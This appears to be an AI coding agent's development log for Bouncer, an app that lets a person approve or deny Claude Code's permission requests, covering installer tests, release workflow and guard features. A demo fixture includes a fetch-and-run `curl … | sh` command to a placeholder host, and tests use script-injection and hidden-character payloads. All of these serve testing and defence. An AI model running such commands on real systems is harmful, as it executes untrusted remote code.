  WebView2 folder; our step adds `%APPDATA%\Bouncer`, only when ticked and
  never in an update. The one exception to "one wipe path" (U9, W7).
- Upgrades never ask (Charan's review of #33). Tauri's installer runs the
  previous uninstaller itself when the version changes ("uninstall before
  installing", its reinstall page) with `_?=<install dir>` appended, and
  NSIS then runs that uninstaller in place, from the install folder. A
  person's uninstall (Settings > Apps) starts the uninstaller without it, so
  NSIS first copies it to `%TEMP%\~nsuN.tmp\Un.exe` and runs the copy (seen
  in the c-5 run). Our step asks only when the uninstaller does not sit
  beside `bouncer-app.exe` (`$EXEDIR`), plus not /UPDATE, silent or passive.
  The main program's name is pinned by a test. "No" stays the default.
  Proven by reading Tauri 2.12.1's template and NSIS's documented `_?=`;
  the upgrade run itself is in the disposable test below.
- Tauri's uninstaller also deletes a `Run` value named `Bouncer`, i.e. our
  autostart (c-3).

Check on this PC (2026-10-13; Charan asked for it). This Claude Code runs
inside the Claude desktop app, which is an MSIX package: Windows sends its
child processes' writes under `AppData` to the package's own storage
(`Packages\Claude_…\LocalCache`), registry writes too. So the install landed
there, not in the real profile; the release's real-desktop install is a
Phase 9 hand check. Found because the redirected folders also grant the
package's capability SID full control, and Bouncer's trust check (rightly)
refused that history folder and rules file: fail safe, not a bug.

| Step | Result |
| --- | --- |
| Install (`/S`) | Exit 0, no admin prompt; the four files; uninstall entry; Start menu shortcut |
| Use | Hooks installed with the installed `bouncer.exe` into a scratch `CLAUDE_CONFIG_DIR`; its command is `%LOCALAPPDATA%\Bouncer\bouncer-hook.exe`; a permission request through it waited on a card for 100 s and printed nothing (timed out unanswered) |
| Install over itself, app running | The app was closed; one uninstall entry; `settings.json` unchanged; hook path valid; a request waited on a card again |
| Uninstall, box unticked (first build) | Console with the diff → `y` → backup, hooks removed, `settings.json` byte for byte; files, entry, shortcut gone; `%APPDATA%\Bouncer` and the WebView2 folder kept |
| Uninstall, box ticked (final build) | The why right above `[y/N]`; `y` → backup, `settings.json` byte for byte; `%APPDATA%\Bouncer` and the WebView2 folder gone; other folders untouched |
| Real disk and registry (checked from outside the container) | No `Bouncer` program folder, no uninstall key, no `Run` value, no test keys |

The uninstaller was driven without mouse or keys: UI Automation found its
window, the box and buttons got `BM_SETCHECK` / `WM_COMMAND`, and the
console's answer was written into that console's input only.

One side effect, repaired: the ticked uninstall deleted
`%LOCALAPPDATA%\io.github.charanp11.bouncer` (the WebView2 folder of the
same app ID, which Charan's dev app also uses) in the real profile. It had
been copied first and was restored from outside the container (765 files,
55.5 MB; 10 long-path cache files didn't copy and are rebuilt by WebView2).
The dev app and an installed Bouncer share that folder because they share
the identifier: a real user has only one.

**c-5 review fixes (Charan, 2026-10-13).**

1. Dev builds share nothing with an installed Bouncer. `bouncer_relay::NAME`
   is `Bouncer-dev` in debug builds and `Bouncer` in release builds; it
   names the pipe (`\\.\pipe\bouncer-dev-<SID>`) or socket
   (`~/Library/Application Support/Bouncer-dev/bouncer.sock`), the data
   folder (`%APPDATA%\Bouncer-dev`: rules, preferences, history, chat) and
   the autostart value. The identifier: `tauri.conf.json` (dev, tests,
   smoke) is `io.github.charanp11.bouncer.dev`, so its own WebView2 folder;
   `tauri.release.json` (only the installer build) sets
   `io.github.charanp11.bouncer`. Tests: the app's
   `dev_and_release_builds_share_nothing` (identifiers, data folder, pipe)
   and the relay's `dev_and_release_builds_have_their_own_names`, which CI
   also runs in a release build. The macOS smoke test uses the dev folder.
   Charan's dev app keeps its playground rules (`BOUNCER_RULES`); its
   WebView2 data starts fresh in the `.dev` folder (nothing of Bouncer's
   lives there; settings are in `preferences.json`).
2. Upgrades never offer to remove hooks: see "Upgrades never ask" above.
3. New standing rule (`CLAUDE.md`): no uninstall, wipe or delete step that
   can reach Charan's real profile; destructive tests only in scratch paths
   or a disposable environment.
4. Windows Sandbox: not on this PC. Windows 11 Home Single Language
   (`CoreSingleLanguage`, build 26100); Sandbox needs Pro, Enterprise or
   Education; `WindowsSandbox.exe` isn't there. The disposable environment
   is GitHub's `windows-latest` runner (a fresh VM per job), with c-6:

   | Step (CI job `installer`, after the release build) | Expected |
   | --- | --- |
   | Install `setup.exe /S` | Exit 0, no elevation; four files in `%LOCALAPPDATA%\Bouncer`, uninstall entry, Start menu shortcut |
   | Hooks with the installed `bouncer.exe` into `$CLAUDE_CONFIG_DIR` | Points at the installed `bouncer-hook.exe` |
   | Use: a permission request through that hook | Waits on a card (still running after 10 s), then stopped |
   | Autostart: `Run` value written and read back, then removed | Only our value; uninstall also clears it |
   | Upgrade: a second build with a higher version, interactive, "uninstall before installing" (driven with UI Automation) | Our console never opens; hooks and path kept |
   | Uninstall from the uninstaller, box unticked, `y` in the console | Diff shown, backup, `settings.json` byte for byte; data kept |
   | Reinstall, uninstall with the box ticked | `%APPDATA%\Bouncer` and the WebView2 folder gone |

   The same steps are Charan's hand check on a real desktop (TESTS, Phase 9
   hand checks), since the runner isn't his machine.

**c-6: Release workflow (2026-10-13).** `.github/workflows/release.yml`,
on a pushed tag `v*.*.*` only.

| Job | What | Permissions |
| --- | --- | --- |
| `version` | `scripts/version.mjs tag`: vX.Y.Z and 0.7.0 or later, else it stops (old v0.5.x / v0.6.x tags never get further) | contents: read |
| `checks` | `ci.yml` itself (now also `workflow_call`): fmt, clippy, tests, check-tests on Windows and macOS, deny, npm audit, gitleaks | contents: read |
| `installer-test` | `installer.yml`: the disposable test below | contents: read |
| `build` | Clean (no cache) on windows-latest: `version.mjs set` → `bundle.mjs` → `version.mjs check` (crates, package.json, tauri.conf.json and the installer's name agree); the signing slot (commented); `SHA256SUMS.txt`; uploaded as an artifact | contents: read |
| `release` | Checksums re-checked; `actions/attest-build-provenance` on the installer; notes (how to verify the SHA-256 and the attestation, the SmartScreen line, changes since the last tag); `gh release create --draft --verify-tag` | contents, id-token, attestations: write (the only writer) |

New actions are GitHub's own, pinned by SHA to releases at least two weeks
old: `upload-artifact` v7.0.1, `download-artifact` v8.0.1,
`attest-build-provenance` v4.2.2. No third-party ones. Version: plain
X.Y.Z only (the installer needs numbers), stamped at build time, never
committed: the repo stays at 0.0.0.

`installer.yml` (the disposable test from the c-5 review, item 4): on PRs
that touch the installer, from the release workflow, and by hand. Builds
this commit twice, as 0.0.1 and 0.0.2, on a fresh windows-latest runner,
then `scripts/installer-test.ps1` (refuses nothing, so never run it on a
real profile): install; hooks with the installed `bouncer.exe` into a
scratch `CLAUDE_CONFIG_DIR`; a card through the installed hook; Start with
Windows on and off through Settings (Ctrl+Alt+B, then UI Automation in the
WebView); the upgrade driven through its pages with "Uninstall before
installing" ticked while a watcher checks `bouncer.exe` never runs;
uninstall unticked (console `y`, `settings.json` byte for byte, data
kept); reinstall, uninstall ticked (data gone). Results land in the job
summary. TESTS W9, W10. `check-tests` now also accepts a CI job's files as
its proof (they must exist), and checks `ts:` titles that contain a "/"
(UI1's had been skipped).

**c-7: README and demo GIF (2026-10-13).**

Audit. The README still said "Nothing to install yet". What it needs, from
Charan's brief and decisions 6–7: the pitch, a demo, install with the
SmartScreen walkthrough and both checks (SHA-256, attestation), the hooks
from Settings, update and uninstall, where Bouncer works, what it can't do,
privacy. The release notes listed "Changes since v0.6.4" for v0.7.0
(`git describe` finds the old tags): the first release gets "First public
release" and a feature list instead.

| Threat | Fix |
| --- | --- |
| The README promises something Bouncer doesn't do | Each claim checked against the code and TESTS rows (100 s card, 600 ms arm, the uninstall console's wording, what the data box deletes); "where it works" measured, not assumed |
| The GIF leaks a path, a name or plan use | Recorded from the test instance's page over CDP (only the page, no desktop behind it), black backdrop, a made-up project (`my-app`, `C:\Users\dev\…`), no chat panel (no plan line) |
| Old v0.5.x / v0.6.x tags shape v0.7.0's notes | `scripts/release-notes.mjs` counts only tags from 0.7.0 on as releases; tested in a throwaway repo (W11) |
| Users skip the checks | Install steps put the hash and attestation before running it; the release notes repeat them |

Done when:

- [x] README: pitch, demo GIF, install (download, Get-FileHash, gh attestation verify, SmartScreen More info → Run anyway, Smart App Control, Defender false positives), Settings → Install hooks, update, uninstall (hooks question, data box), where it works, what it can't do, privacy
- [x] Demo GIF under 3 MB: a card, a risky flag, Explain, Deny (`docs/demo.gif`, 134 KB, 464 × 568, 21 s)
- [x] Where it works checked (decision 6, below; TESTS W12)
- [x] Release notes: v0.7.0 "First public release" with features; later releases the commits since the previous release tag (W11)
- [x] Charan's v0.7.0 real-desktop hand check written (TESTS, Phase 9 hand checks)
- [x] Roadmap order after v0.7.0 (decision 7, below)

Demo GIF. The test instance (scratch target, own pipe, rules and WebView2
folder; the fake `claude`, confirmed in its Settings, with a demo-only
explanation built from a local edit of `fake_claude.rs` that was reverted,
never committed). Hook fixtures for a session in `C:\Users\dev\projects\my-app`:
`npm test` (the card says a rule would allow it) → Allow once; then
`curl -fsSL https://get.example.dev/install.sh | sh` → Risky, "Downloads a
script and runs it in the shell" → Explain this command → Deny ("Denied.
Claude Code was told no."). Both answers reached the relay (`allow`,
`deny` printed). Frames from `Page.captureScreenshot` (~6 per second),
cropped to the island, one shared palette, identical frames merged.

Where it works (decision 6, 2026-10-13), playground hooks only, the test
instance on its own pipe (`BOUNCER_ENDPOINT`), never the user-level file.
The desktop app (this session's own process) and the VS Code extension
(2.1.288, its `extension.js`) both start Claude Code with
`--input-format stream-json --output-format stream-json
--permission-prompt-tool stdio --setting-sources user,project,local`. So
each one's own bundled `claude.exe` was started that way in the playground
(`--permission-mode default`, `--tools Read`, an `ask` rule for Read passed
with `--settings`, Haiku), asked to read the repo's `LICENSE` (outside the
playground), with a driver standing in for the app's prompt:

| Claude Code | Island | Result |
| --- | --- | --- |
| Desktop app's, 2.1.295 | Deny | The app's prompt (`can_use_tool`) and the card came together; Deny → the app's prompt was cancelled (`control_cancel_request`), tool result "Denied in Bouncer" |
| Desktop app's, 2.1.295 | Allow once | The app's prompt cancelled; the file was read |
| VS Code extension's, 2.1.288 | Deny | As the desktop app's |
| VS Code extension's, 2.1.288 | Allow once | As the desktop app's |
| Desktop app's, 2.1.295 | (none; the app answered no) | The tool was denied; the card stayed until the turn ended (Stop), then left |

Every hook fired (SessionStart, UserPromptSubmit, PreToolUse,
PermissionRequest, Stop, SessionEnd: `bouncer-playground/recorded`
514–519). The terminal is what every earlier hand check used. Not checked:
the apps' own windows (the hosts' launch was reproduced, not their UI); the
hand check below has an optional step for that. Claude Code on the web runs
in the cloud: its hooks can't reach this PC. Found on the way: reads
outside the project weren't prompted in 2.1.295's default mode (hence the
`ask` rule), and Claude Code's own scratch folder is pre-allowed.

Permission modes (2026-10-13, after the draft; Charan's review). Bouncer
only sees what Claude Code asks. Checked the same way as above (the
desktop app's Claude Code 2.1.295, stream-json, playground hooks, test
instance, `--tools Bash`): in `acceptEdits`, `mkdir c7-accept-edits-check`
ran with no prompt and no card (the empty folder was removed after);
`node -e "console.log(1)"` asked, the card came with Explain, and island
Deny reached Claude Code. `bypassPermissions` never asks (Claude Code's
definition); `auto` asks rarely (Phase 1's note, and the hand check's auto
session showed no card). README "What it can't do" and the v0.7.0 draft's
notes say so ("Known limit"). Guarding every mode is roadmap c3 (audit
first).

- [x] Known limit in the README and the v0.7.0 draft notes, from the check above

Manual checks (Charan, 2026-10-13, Claude Code 2.1.295, Windows, the
v0.7.0 draft's installer, his own desktop; TESTS, Phase 9 hand checks):

- Passed: install, SmartScreen (More info → Run anyway), hooks from
  Settings, the island picked up a real session, chat, Ctrl+Alt+B, Start
  with Windows, uninstall with the hooks removed (the console's diff and
  "Answer N to keep them" above `[y/N]`).
- Skipped: reinstall (CI's installer test, W10).
- Not run: step 5 (risky card + Explain + Deny; Charan, 2026-10-14).
  Not reported: the hash check and a card answered from a real session.
  Covered by CI (A1, A8, E1–E8) and the c-7 test-instance runs.
- Found on the way, not Bouncer: this repo's own `.claude/settings.json`
  had `attribution.commit` / `.pr` as `false`; Claude Code 2.1.295 wants
  strings (`""`) and stops at a settings error before the session starts,
  so no hooks fire there until it's fixed. The auto-mode session showed in
  the island with no card (Known limit above).

Roadmap after v0.7.0 (decision 7). One feature per release:

| Release | What | Roadmap item |
| --- | --- | --- |
| v0.8 | Answer Claude Code's questions in the island | c2 |
| v0.9 | File drop | d (Phase 7) |
| then | Other agents, one per release | h |
| then | Ask about this session | f (6d) |
| then | Mac release | g |
| then | Music | e (Phase 8) |
| optional | Linux | i |

**c3: guard every mode (2026-10-14).**

Audit. Bouncer only sees what Claude Code asks (README, "Known limit"): in
`bypassPermissions` nothing is asked, in `auto` little, in `acceptEdits`
not edits or file commands. Since 2.1.283, auto is the starting mode for
terminal and VS Code sessions. Claude Code's hooks reference: a PreToolUse
hook may return `permissionDecision` `allow` / `deny` / `ask` / `defer`;
"ask" prompts the user; precedence among hooks is deny > defer > ask >
allow; ask "also forces a permission prompt in auto mode". Nothing on
bypass, so it was measured (Claude Code 2.1.295, the desktop app's
`claude.exe` started stream-json with `--permission-prompt-tool stdio`,
playground hooks, the test instance, a throwaway PreToolUse hook that
always says "ask", passed with `--settings` only; `node -e
"console.log(1)"`):

| Mode | Hook says "ask" | No hook |
| --- | --- | --- |
| default | prompt, Bouncer's card, island Deny reached Claude Code | prompt |
| auto | the same | — |
| acceptEdits | the same | — |
| bypassPermissions | the same | ran, unasked |
| `claude -p`, bypassPermissions | refused at once, no prompt, no card (Allow or Deny made no difference) | — |
| `claude -p`, default | — | prompt → card → island Allow ran it |

So an "ask" from our PreToolUse hook brings the card back in every mode,
but in a `-p` run it is a refusal. The hook input has no field that tells
a `-p` run apart (PreToolUse and SessionStart payloads compared:
`effort`, `permission_mode`, `prompt_id`, `scratchpad_dir`, `tool_name`,
`tool_use_id`, `source`); environment variables aren't used (VS Code and
the desktop app may share them).

Decisions (Charan, 2026-10-14):

1. Skip `dontAsk` (`permission_mode`): there, anything that would prompt
   is denied, so "ask" would be Bouncer denying. `-p` can't be told apart:
   bypass stays in, and with the switch on a risky command in a `-p` run is
   refused instead of run (documented in the switch's text and the README).
2. An opt-in Settings switch, off by default, whose text says exactly what
   it changes.
3. Risky requests only (a risk reason, as the card's red flag), not
   compound / unparseable ones.
4. A terminal hand check (dev build, playground) before the release.
5. "ask" only when Bouncer is running and the request is risky; otherwise
   nothing is printed, as today. Never "deny", never "allow".

Found while measuring (Claude): in `default` and `plan` Claude Code
prompts anyway, and in a default-mode `-p` run our "ask" would turn
today's card into a refusal. So "ask" is returned only in `auto`,
`acceptEdits` and `bypassPermissions`: the modes where Claude Code
wouldn't ask by itself. Any other or unknown mode prints nothing.

Design:

- The switch is policy, so it lives in `rules.toml` beside `mode`
  (`guard = true`; missing = off), written by Settings like the auto-allow
  switch (checked, atomic, reloaded, shown like any edit). Not
  `preferences.json` ("never security policy").
- `Event` keeps `permission_mode`. The desk answers a PreToolUse with
  `Ask` only if: guard on, not paused, the mode is one of the three, and
  core's check gives at least one risk reason. It records the event as
  before; the card comes from the PermissionRequest that follows.
- Wire: for a PreToolUse the server may write exactly `ask`; allow / deny
  stay for PermissionRequest only. The relay prints the documented
  PreToolUse JSON (`permissionDecision: "ask"`, a fixed reason) only for
  exactly `ask` on a PreToolUse, inside the existing 2 s fire-and-forget
  budget; anything else, late or missing prints nothing.

| Threat | Fix |
| --- | --- |
| The guard approves something | The relay can only print "ask" for a PreToolUse; allow / deny are still PermissionRequest-only, and the desk's PreToolUse path returns only `Ask` or nothing (tested on both ends) |
| The guard denies on its own | Never "deny"; `dontAsk` skipped; `-p` refusal is the one documented exception, behind the opt-in switch |
| Bouncer closed, paused, slow or confused blocks or changes Claude Code | No answer in 2 s, app absent, paused, guard off, unknown mode, parse error: nothing printed, as today |
| Agent text in the reason Claude Code shows | The reason is a fixed string in the relay; the card shows core's fixed risk clauses |
| A broken or older rules file | `guard` is a known key; a wrong type is a refused file (built-in rules, guard off), like a bad `mode` |
| The switch turned on behind the user's back | It only adds prompts; any change to `rules.toml` is shown in the island ("Rules changed") |
| More prompts than wanted in default mode | Not touched: "ask" only in auto, acceptEdits, bypass |

Done when:

- [x] `rules.toml` `guard` (missing = off), parsed and written (`set_guard`); Settings switch, off by default, with what it changes (prototype v0.27) (G1)
- [x] The desk asks only for risky PreToolUse requests in auto / acceptEdits / bypassPermissions, guard on, not paused; nothing otherwise (G2)
- [x] The wire and the relay: exactly `ask` on a PreToolUse prints the documented JSON; nothing else ever does; allow / deny unchanged (G3)
- [x] TESTS rows (unit, integration through the real relay); README and the "Known limit" updated
- [x] Test instance: a real Claude Code (playground hooks) in bypass, auto and acceptEdits shows the card for a risky command with the switch on, and runs unasked with it off (G4, below)
- [x] Charan's terminal hand check written (dev build, playground; TESTS, hand checks)

Implemented. Core: `Rules::guard`, `rules::set_guard` (the mode
switch's line rewrite, shared as `set_top`), `Event::mode`
(`permission_mode`), `ipc::Decision::Ask` (sent only for a PreToolUse),
`Desk::set_guard` and `State::guards`; "Rules changed: guard on / off".
Relay: `guard_json`, a fixed reason ("Bouncer flagged this request as
risky (Guard every mode)."). App: `set_guard` (a bool), granted to the
page and listed in the strict-commands test. Page: the row after
Auto-allow; its hint wraps (`.hint.wrap`, also in the prototype) because a
one-line hint cut it off with "…" (seen on the test instance).

Verify (2026-10-14, test instance from this branch, release-style page;
the desktop app's Claude Code 2.1.295, stream-json with
`--permission-prompt-tool stdio`, playground hooks plus this branch's
relay as a PreToolUse hook passed with `--settings`; `sh -c 'echo
guard-test'`, risky: "runs a command hidden inside a string"):

| Case | Result |
| --- | --- |
| Settings, scratch rules file from before the guard | Row "Guard every mode · Off" after Auto-allow, hint in full; On → one line `guard = true` added above the first table, switch On |
| Guard on: bypassPermissions, auto, acceptEdits | Each: Claude Code's prompt and the Risky card; island Deny → "Denied in Bouncer" |
| Guard on, bypass, `echo guard-safe` | Ran, no prompt, no card |
| Guard off (page switch, `guard = false`), bypass | The risky command ran unasked (as v0.7.0) |
| Guard on, `claude -p`, bypass | Risky: refused, Claude said the Bouncer guard blocked it; safe: ran |

**c2: answer Claude Code's questions in the island (2026-10-14).**

Audit. Claude Code's hooks reference: `AskUserQuestion` and `ExitPlanMode`
"require user interaction"; a hook answers them with "allow" together with
`updatedInput` ("allow" alone is not enough). For a question, `updatedInput`
echoes the original `questions` and adds `answers`: question text → chosen
label, several labels joined with ", ". For a plan, Claude Code injects
`plan` (Markdown) and `planFilePath` into the input the hooks get.

Measured (2026-10-14; a throwaway hook passed with `--settings` in the
playground, MCP off; the desktop app's Claude Code 2.1.295 and VS Code's
2.1.288 started as their apps start them (stream-json, prompts over stdio,
a driver that never answers unless told to), and the terminal, 2.1.295,
auto-updated to 2.1.299 during the run):

| | default | plan | acceptEdits | auto | bypass | dontAsk |
| --- | --- | --- | --- | --- | --- | --- |
| PermissionRequest fires for the question / plan | yes | yes | yes | yes | yes | no: Claude Code denies it itself |
| Hook's answer reached Claude (desktop's) | ✓ | ✓ | ✓ | ✓ | ✓ | — |
| VS Code's | ✓ | ✓ | — | 2.1.288 started it as default | ✓ | — |
| Terminal | ✓ | ✓ | ✓ | ✓ | not run (its warning needs accepting) | denied, as above |

- PermissionRequest with allow + `updatedInput`: answered ("Blue"); one
  pick, several picks ("Red, Blue"), two questions and a typed free-text
  answer all reached Claude. A **partial** answer (one of two questions)
  was accepted without a word. "Allow" without `answers` did nothing (the
  question stayed open); "deny" gave Claude an error with our message.
- ExitPlanMode: the hook got the plan text and its path. A plain approval
  left plan mode for `default`; a `setMode` entry could switch to
  `acceptEdits`. A denial reached Claude with our message.
- Timing: with PermissionRequest the terminal shows the question / plan
  dialog **while the hook waits**; a hook answering after 20 s closed it
  ("Allowed by PermissionRequest hook"). In the stream-json hosts, when the
  app answered first, the hook's later answer was dropped (first answer
  wins). A PreToolUse hook blocks: nothing is shown ("running PreToolUse
  hook · 11s") until it returns. So PermissionRequest only.
- Not checked by Claude: answering in the terminal first while a card
  waits (no keystrokes into the terminal), bypass in the terminal, the
  apps' own windows. The first two are in Charan's hand check (TESTS Q9).
- Side effects of the audit runs (Charan, 2026-10-14): a Haiku run tried
  the claude.ai Slack connector (unanswered, nothing sent); a plan landed
  in `~/.claude/plans` (`plansDirectory` via `--settings` was ignored;
  Charan deleted it). Since then every run uses `--strict-mcp-config`, and
  nothing may write into the real `~/.claude`. Measured after: even a
  stream-json run with `--no-session-persistence`, no Write tool and
  `--strict-mcp-config` rewrites `~/.claude/.credentials.json` and
  `~/.claude.json` at start; terminal runs save transcripts. So real runs
  wait for Charan's choice of a way (open item); c2 is verified with
  fixtures through the real relay, the test instance and the page.

Decisions (Charan, 2026-10-14):

1. Listed options only; free text stays in the terminal.
2. A plan: "Approve" and "Keep planning" only; never change the session's
   mode. Keep planning = deny with fixed text, nothing from the page.
3. A multi-select question with a label containing ", " gets no card.
4. Rules (auto mode), the guard and observe mode never answer a question
   or a plan; only a click does. Paused: no card.
5. Answered in the terminal or the app first: the card leaves as soon as
   Claude Code moves on, and a late click sends nothing.
6. No keyboard shortcut answers. Question, option and plan text are
   hostile: `textContent`, hidden characters shown, plans through the
   roadmap-a Markdown renderer. Too big to forward: no card.

Design:

- Wire: for a PermissionRequest of `AskUserQuestion` the server may write
  `answer <picks>` (per question, comma-separated 0-based option numbers;
  questions separated by `;`, e.g. `answer 0;1,2`); for `ExitPlanMode`,
  `approve` or `keep`. `allow` / `deny` stay for every other tool; a
  question never gets them, and nothing else gets these.
- Relay: keeps the `tool_input` it read and builds `updatedInput` from it:
  the original input plus `answers` (labels looked up by number), or the
  original input for `approve`; `keep` is a deny with a fixed message. A
  shape it doesn't accept (shared check, `bouncer_relay::questions`: 1–4
  questions, unique non-empty texts, 2–4 options with unique non-empty
  labels, `multiSelect` a bool or absent, no ", " in a multi-select's
  labels, no `answers` already), a number out of range, a missing or
  doubled pick, several picks for a single-select, or anything unknown:
  nothing is printed, the terminal keeps asking.
- Desk: a question / plan PermissionRequest, not paused, with a shape the
  shared check accepts, gets a card of its own kind (no rules check, no
  "would", no offer); anything else stays "question in the terminal" as
  before. `answer(id, picks)` and `plan(id, approve)`: single-use IDs;
  answering and approving arm after 600 ms like Allow; picks are checked
  against the stored questions; `decide` and `always` refuse these cards.
  The card leaves when its relay hangs up (Claude Code moved on) or the
  turn moves on, as every card does.
- Page: the question card shows each question (header, text, options with
  descriptions, one or several picks) and "Send answer", armed 600 ms and
  only once every question has a pick; the plan card shows the plan
  (Markdown, scrolls) with "Keep planning" and "Approve plan" (armed). The
  page sends only the request ID and option numbers, or approve / keep.
  Enter never sends (armed buttons are `.btn.allow`); focus arrives on
  the first option (a pick only selects) or on Keep planning, never on a
  button that sends an answer.

| Threat | Fix |
| --- | --- |
| The page (or a compromised page) answers with text of its own, or changes the question | The page sends numbers or approve / keep; the relay builds `updatedInput` from its own copy of the input; the backend checks numbers against the stored questions; tested on both ends |
| Bouncer picks an answer by itself | No rule, the guard, observe mode or a timeout ever answers; only `answer` / `plan` from a click on that card's ID (tested) |
| A plain "allow" / "deny" for a question, or "answer" for a command | The wire sends each word only for its tool; the relay accepts each only for its tool (tested both ends) |
| A partial answer that Claude Code accepts silently | Send arms only when every question has a pick; the backend and the relay refuse a missing pick |
| Ambiguous answers (", " in a multi-select label, two options or questions with the same text) | No card; the relay prints nothing for them |
| A late click after the terminal / app answered | The card leaves when the relay hangs up or the turn moves on; its ID is then unknown and nothing is sent |
| Bouncer closed, paused or slow | The terminal / app already shows the question while the hook waits; paused queues nothing; the app gives up before the relay's budget |
| Hostile question / option / plan text (markup, bidi, zero-width) | `visible()` in the backend, `textContent` and red tags in the page, the roadmap-a renderer for plans (links never clickable) |
| A question too big | The relay drops events over 1 MB whole (no card); the page scrolls long text, never cuts it |
| Approving a plan changes the session's mode | Never: no `updatedPermissions` |
| A keystroke answers | Enter is stopped on armed buttons; arrival focus never on Send / Approve; no shortcut answers |

Done when:

- [x] Shared shape check and answer builder in the relay library; relay prints answers / approve / keep only for their tool, built from its own input; anything odd prints nothing (Q1, Q2)
- [x] Wire: `answer` / `approve` / `keep` only for their tool's PermissionRequest; `allow` / `deny` never for them (Q3)
- [x] Desk: question and plan cards (not paused, accepted shape); never answered by rules, guard or observe mode; `answer` / `plan` single-use, armed, checked; `decide` / `always` refuse them; leaves when answered elsewhere (Q4, Q5, Q6)
- [x] App: `answer` and `plan` commands, granted to the page, listed in the strict-commands test (Q7)
- [x] Prototype v0.28: Question and Plan states and their rule; the page built to it (Q8)
- [x] Correction 13 and TESTS A10 updated; TESTS rows Q1–Q9; README
- [x] Test instance: question and plan payloads through the real relay, answered from the page; late click sends nothing (real runs of Claude Code wait for Charan's way to keep `~/.claude` untouched)
- [x] Charan's hand check written: terminal answer first while a card waits; bypass in the terminal (TESTS hand check 5, Q9)

Implemented. Relay library: `questions` (`questions`, `picks`,
`picks_line`, `answered`), shared with core. Relay: keeps the trimmed
event; `decision_json(answer, tool, input)` prints each word only for its
tool; `KEEP_PLANNING` is fixed text. Core: `Decision::Answer(picks)` /
`Decision::Plan(bool)`, written as `answer <picks>` / `approve` / `keep`
only for their tool; `Kind` per card (permission, question, plan),
`Desk::answer` / `Desk::plan`, `pending(id, kind)` so `decide` / `always`
refuse the new cards; the guard skips both tools; the view adds `kind`,
`questions`, `plan`. Rules can't name these tools anyway (`tool` takes file
tools only). App: `answer`, `plan`. Page: `questionParts` / `planParts`
(prototype v0.28), picks in `src/questions.ts`, plans through the chat's
Markdown renderer (`answerInto`), arrival focus by kind (`arrivalFocus`).
No new dependency.

Verify (2026-10-14, test instance from this branch: scratch target,
release-style page, its own pipe, rules and WebView2 folder; payloads in
the shape Claude Code 2.1.295 sent in the audit, through the branch's
relay; the page driven over CDP):

| Case | Result |
| --- | --- |
| Two questions (one multi-select) | Question card as the prototype; Send greyed until both had a pick; picks [0] and [0, 2] → relay printed allow with the input plus `answers` "Option numbers only" / "Unit, Page" |
| Hostile question (`<img onerror>`, `<script>`, RLO, zero-width) | All as text; no element made; U+202E / U+202C / U+200B as red tags |
| Keyboard arriving with a card up | Question: the first option; plan: Keep planning |
| Relay stopped with the card up (answered elsewhere) | Card gone; a late `answer` refused ("unknown or already answered request"); nothing printed |
| Plan with Markdown, a link and RLO | Rendered from text, link as text, red tags; Approve plan → allow with the input exactly as it came |
| Plan with no text | "No plan text was sent. Read it in the terminal."; Keep planning → deny "Not approved in Bouncer: keep planning." |
| A question with no options | Relay done in 108 ms, nothing printed, no card; pill "Needs you · question in the terminal" |

Real runs (2026-10-14, after Charan's go-ahead). Every run: the test
config folder (`CLAUDE_CONFIG_DIR=%USERPROFILE%\bouncer-test-claude`,
Charan's one-time login), `--strict-mcp-config`, the playground's own
hooks (`--setting-sources project,local`; the branch's relay in
`target\debug`, pointed at the test instance's pipe), Haiku, and an
environment with none of the calling session's `CLAUDE*` / `ANTHROPIC*`
variables. The real `~/.claude` was checked untouched by the runs
(timestamps; the only changes since 22:20 are this Claude Code session's
own, from before the first run). Stream-json as the desktop app and VS Code
start Claude Code, the island answered over CDP:

| Case | Claude Code | Result |
| --- | --- | --- |
| Single pick (Blue) | desktop's 2.1.295 | The app's own prompt cancelled; Claude got "Blue" |
| Multi pick (Red, Blue) | desktop's 2.1.295 | Claude got "Red, Blue" |
| Two questions | desktop's 2.1.295 | Claude got "Blue" and "Small" |
| Plan, Approve plan | desktop's 2.1.295 | "User has approved your plan", the plan as written |
| Plan, Keep planning | desktop's 2.1.295 | Tool error "Not approved in Bouncer: keep planning." |
| Question answered in the app first (3 s) | desktop's 2.1.295 | Claude got the app's "Red"; the card left; a late `answer` refused |
| Plan approved in the app first | desktop's 2.1.295 | Approved by the app; the card left; a late `plan` refused |
| Single pick | VS Code's 2.1.288 | Claude got "Red" |

Found by the real runs and fixed (`6ccc0aa`): when the desktop app's or
VS Code's own prompt answers first, Claude Code doesn't stop the hook, and
the tool's PostToolUse carries a different input (a question's with
`answers` added; a plan's the model's own `{}`), so the card stayed up until
the turn ended. A question or plan card now leaves on its session's
PostToolUse / PostToolUseFailure of the same tool (Q6).

Hand checks 4 and 5 (2026-10-14), driven by Claude, not by hand: the
terminal's Claude Code 2.1.299 run interactively through a Windows pseudo
console (ConPTY, a scratch Python driver typing keys), the same test setup
as above, the test instance answered over CDP; what Claude Code did read
from the playground's recorded hook events. Bypass's warning and the
playground's folder trust were accepted in the test config folder.

| Step | Result |
| --- | --- |
| 4.1 Guard every mode on (Settings) | `guard = true` in the test rules file; the hint in full |
| 4.2 Bypass, `sh -c 'echo guard-test'` | Claude Code's prompt with the guard's reason and the Risky card ("Runs a command hidden inside a string."); island Deny: it didn't run |
| 4.3 Bypass, `echo guard-safe` | Ran (stdout "guard-safe"); no PermissionRequest, no card |
| 4.4 Auto mode, the risky command | Prompt and card; island Allow once: it ran ("guard-test") |
| 4.5 Accept edits, the risky command | Prompt and card; Yes in the terminal: it ran; the card left |
| 4.6 Guard off, bypass | `guard = false`; it ran unasked, no PermissionRequest, no card |
| 5.1 Question, default mode | Question in the terminal and the card; island Blue → Claude "GOT=Blue" |
| 5.2 Answered in the terminal first (Red) | The card was gone at the first check; a late `answer` refused; Claude "GOT=Red" |
| 5.3a Plan, Keep planning in the island | Claude was told to keep planning |
| 5.3b Plan, Approve plan in the island | Approved. The session went back to the mode it had before plan mode: accept edits (reached by Shift+Tab manual → accept edits → plan); started in plan mode, manual. Bouncer sets no mode; the terminal's own first option would have chosen auto |
| 5.4 Bypass mode in the terminal | The card; island Blue → Claude "GOT=Blue" |
| 5 step 5 (tray Pause) | Not driven (the tray menu); covered by Q6 / A10 tests |

Manual checks: the hand checks above were driven by Claude (pseudo console),
not by Charan; Claude Code 2.1.299 (terminal), 2026-10-14.

**Updater (2026-10-15, before v0.8.0).**

Audit (report and Charan's decisions, 2026-10-15). Tauri's official
updater plugin, `tauri-plugin-updater = "=2.13.3"` (2.14.0 was a day old),
